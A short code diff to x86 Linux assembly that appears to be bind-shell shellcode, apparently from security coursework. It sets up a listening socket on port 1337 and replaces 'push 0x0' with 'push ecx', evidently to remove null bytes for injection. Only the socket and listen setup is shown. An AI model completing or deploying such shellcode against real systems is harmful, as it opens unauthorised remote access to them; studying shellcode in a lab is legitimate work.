@@ -53,7 +53,7 @@ _start:
 
 					
 						; setup stack for [sockaddr *addr] structure
-	push 0x0			; INADDRY_ANY ... REMOVE??    /usr/src/linux-headers-5.10.0-kali7-common/include/uapi/linux/in.h
+	push ecx			; INADDRY_ANY
 	push word 0x3905	; port 1337 = 0x539  = rev.. 0x3905
 	push word 0x2		; sa_family_t = AF_INET
 	mov ecx, esp		; move pointer to structure into ecx 
@@ -75,7 +75,7 @@ _start:
 	mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
 	mov bl, 0x4			; int listen(int sockfd, int backlog)	;
 
-	push 0x0			; backlog (0)
+	push ecx			; backlog (0)
 	push edi 			; socket ptr
 
 	mov ecx, esp
